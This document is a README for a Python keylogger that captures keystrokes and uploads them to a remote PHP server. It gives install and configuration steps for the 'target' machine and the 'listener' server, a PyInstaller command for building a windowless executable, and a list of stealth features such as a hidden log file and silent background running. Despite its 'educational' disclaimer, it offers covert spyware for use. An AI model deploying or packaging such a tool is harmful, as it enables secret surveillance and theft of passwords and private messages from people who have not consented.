# Python Keylogger with Remote Upload

**⚠️ DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY. Do not use this on systems you do not own or have explicit permission to monitor. The author is not responsible for any misuse.**

A lightweight, stealthy Python keylogger that captures keystrokes and uploads them to a remote server.

## Features

- **Readable Logs:** Captures complete words and lines instead of individual characters.
- **Remote Upload:** Sends logs to a configured PHP server via HTTP POST.
- **Stealth Mode:**
  - Runs in the background (no console window).
  - Automatically hides the local log file.
- **Duplicate Prevention:** Clears local logs only after successful upload to prevent duplicates.
- **Offline Buffering:** Stores logs locally if the internet is disconnected and retries later.
- **Clean Output:** Filters out technical keys like `[SHIFT_R]` and `[CTRL_L]` for better readability.

## Installation

### Client Side (The Target)

1. **Install Python 3.x**
2. **Install Dependencies:**

    ```bash
    pip install -r requirements.txt
    ```

3. **Configure `keylogger.py`:**
    - Open `keylogger.py`.
    - Set `SERVER_URL` to your server's endpoint.
    - Set `PASSWORD` to your secret password.
4. **Run:**

    ```bash
    python keylogger.py
    ```

    *To build a standalone executable, use PyInstaller:*

    ```bash
    pyinstaller --onefile --noconsole keylogger.py
    ```

### Server Side (The Listener)

1. If you have no web server, Then you can buy a cheap web server via link (https://client.tezhost.com/aff.php?aff=1710)
2. Upload `commands.php` to your web server (e.g., `public_html/api/`).
3. **Configure `commands.php`:**
    - Open `commands.php`.
    - Set `$PASSWORD` to match the one in `keylogger.py`.
4. Ensure the directory has write permissions so the script can create `keylogs.txt`.

## Usage

- The keylogger runs silently.
- Logs are sent every 60 seconds (configurable).
- Press **ESC** to stop the keylogger (if running interactively).
- Check your server's `keylogs.txt` to view the captured data.

## License

This project is open source. Use responsibly.

## Thanks to

Artist 
follow him -> https://www.linkedin.com/in/ahsan-rasheed-artist/


